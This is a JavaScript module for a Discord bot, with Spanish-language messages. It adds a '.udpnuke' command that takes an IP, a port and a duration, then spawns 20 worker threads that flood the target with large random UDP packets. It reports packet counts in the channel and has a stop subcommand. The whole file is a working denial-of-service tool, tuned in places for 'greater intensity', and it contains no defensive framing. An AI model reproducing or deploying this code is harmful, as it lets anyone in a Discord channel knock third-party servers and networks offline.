const { EmbedBuilder } = require('discord.js');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

let workers = [];
let attackInProgress = false;
let totalPacketsSent = 0;

module.exports = {
    name: 'udpnuke',
    description: 'Inicia o detiene un ataque UDP Nuke',
    execute(message, args) {
        if (args[0] === 'stop') {
            if (attackInProgress) {
                stopAttack(message);
            } else {
                const noAttackEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription('❌ No hay ningún ataque en curso.')
                    .setTimestamp();
                return message.channel.send({ embeds: [noAttackEmbed] });
            }
        }

        if (args.length !== 3) {
            const usageEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Uso: .udpnuke <IP> <Port> <Time>')
                .setTimestamp();
            return message.channel.send({ embeds: [usageEmbed] });
        }

        const [ip, port, time] = args;
        const pps = 8192; // Incrementado para mayor intensidad
        const threads = 20; // Incrementado para mayor intensidad

        if (!isValidIP(ip)) {
            const invalidIpEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('❌ IP no válida.')
                .setTimestamp();
            return message.channel.send({ embeds: [invalidIpEmbed] });
        }

        const embed = new EmbedBuilder()
            .setColor(getRandomColor())
            .setTitle('💥 Iniciando ataque UDP Nuke 💥')
            .setDescription(`**Método:** .udpnuke\n\n**IP:** ${ip}\n**Port:** ${port}\n**PPS:** ${pps}\n**Threads:** ${threads}\n**Time:** ${time}`)
            .setTimestamp();

        message.channel.send({ embeds: [embed] });

        attackInProgress = true;
        let workersCompleted = 0;

        for (let i = 0; i < threads; i++) {
            const worker = new Worker(__filename, {
                workerData: { ip, port, pps, time }
            });

            workers.push(worker);

            worker.on('message', (msg) => {
                if (msg.packetsSent) {
                    totalPacketsSent += msg.packetsSent;
                }

                workersCompleted++;
                if (workersCompleted === threads) {
                    attackInProgress = false;
                    const finalEmbed = new EmbedBuilder()
                        .setColor(getRandomColor())
                        .setDescription(`✅ **Ataque finalizado**. Paquetes enviados: ${totalPacketsSent} 🚀`)
                        .setTimestamp();
                    message.channel.send({ embeds: [finalEmbed] });
                }
            });

            worker.on('error', (err) => {
                const errorEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setDescription(`❌ Error en el worker: ${err.message}`)
                    .setTimestamp();
                message.channel.send({ embeds: [errorEmbed] });
            });
        }
    }
};

function stopAttack(message) {
    workers.forEach(worker => worker.terminate());
    const attacksStopped = workers.length;
    workers = [];
    attackInProgress = false;

    const stopEmbed = new EmbedBuilder()
        .setColor('#FF0000')
        .setDescription(`🛑 **Ataque detenido correctamente**. Paquetes enviados: ${totalPacketsSent}. Ataques detenidos: ${attacksStopped} 🚫`)
        .setTimestamp();
    message.channel.send({ embeds: [stopEmbed] });
}

function isValidIP(ip) {
    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return regex.test(ip);
}

function getRandomColor() {
    const colors = ['#FF5733', '#33FF57', '#3357FF', '#FF33A1', '#A133FF'];
    return colors[Math.floor(Math.random() * colors.length)];
}

if (!isMainThread) {
    const { ip, port, pps, time } = workerData;
    const udpClient = dgram.createSocket('udp4');
    let packetsSent = 0;

    udpClient.on('error', (err) => {
        console.error(`Error: ${err.message}`);
        parentPort.postMessage({ error: err.message });
        udpClient.close();
    });

    udpClient.on('close', () => {
        parentPort.postMessage({ error: 'El servidor está offline o no se puede alcanzar.' });
    });

    const interval = setInterval(() => {
        for (let i = 0; i < pps; i++) {
            const packet = Buffer.from(generateHeavyPayload());
            udpClient.send(packet, port, ip, (err) => {
                if (err) {
                    console.error(err);
                } else {
                    packetsSent++;
                }
            });
        }
    }, 1000 / pps);

    setTimeout(() => {
        clearInterval(interval);
        udpClient.close();
        parentPort.postMessage({ packetsSent });
    }, time * 1000);
}

function generateHeavyPayload() {
    const length = 2048; // Tamaño del payload incrementado para mayor peso
    let payload = '';
    for (let i = 0; i < length; i++) {
        payload += String.fromCharCode(Math.floor(Math.random() * 256));
    }
    return payload;
}
